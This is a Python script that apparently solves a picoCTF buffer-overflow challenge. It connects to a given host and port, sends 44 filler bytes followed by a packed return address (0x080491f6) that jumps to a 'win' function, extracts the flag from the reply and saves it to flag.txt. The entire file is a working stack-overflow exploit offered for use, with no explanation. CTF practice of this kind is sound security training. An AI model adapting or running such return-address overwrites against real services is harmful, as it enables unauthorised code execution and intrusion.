#!/bin/python3

import argparse
import socket
import struct
import re

parser = argparse.ArgumentParser()

parser.add_argument("host", type=str,
                    help="hostname or ip address you tryna connect to")
parser.add_argument("port", type=int,
                    help="port of service you tryna use")

args = parser.parse_args()

offset = 44

winAddress = 0x080491f6
winAddressEndian = struct.pack("<I", winAddress)

payload = b"A"*offset + winAddressEndian + b'\n'

flag = ''

with socket.socket() as connection:
    connection.connect((args.host, args.port))
    connection.recv(4096).decode("utf-8")
    connection.send(payload)
    rawFlag = connection.recv(4098).decode("utf-8")
    flag = re.findall(r'picoCTF{.*}', rawFlag)[0]

with open('flag.txt', 'w') as filp:
    filp.write(flag)
